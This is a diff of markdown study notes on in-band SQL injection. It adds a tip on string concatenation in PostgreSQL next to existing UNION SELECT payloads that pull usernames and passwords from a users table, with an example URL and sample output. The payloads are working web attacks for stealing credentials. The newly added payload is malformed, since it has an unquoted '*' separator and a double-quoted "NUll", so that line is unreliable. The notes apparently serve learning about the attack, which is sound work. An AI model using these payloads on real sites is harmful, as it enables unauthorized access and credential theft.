@@ -48,6 +48,12 @@ when the attacker uses the same communication channel to both launch the attack 
 - to find username and password from table users
 `'+UNION+SELECT+username,+password+FROM+users--`
 
+
+- if there 2 column of 2 different data types and you need to retrieve information
+find version of database, then find the respective way to string concatenate. If it is postgreSQl, use ||
+`'UNION SELECT "NUll", username || * || password FROM users--` * is used to seperate useranme and password for readability
+
+
 `www.test.com/app.php?id=' UNION SELECT username, password FROM users--`
     we didn't give id so it's empty
     `output:ac1, passw1, adm1, pass2`
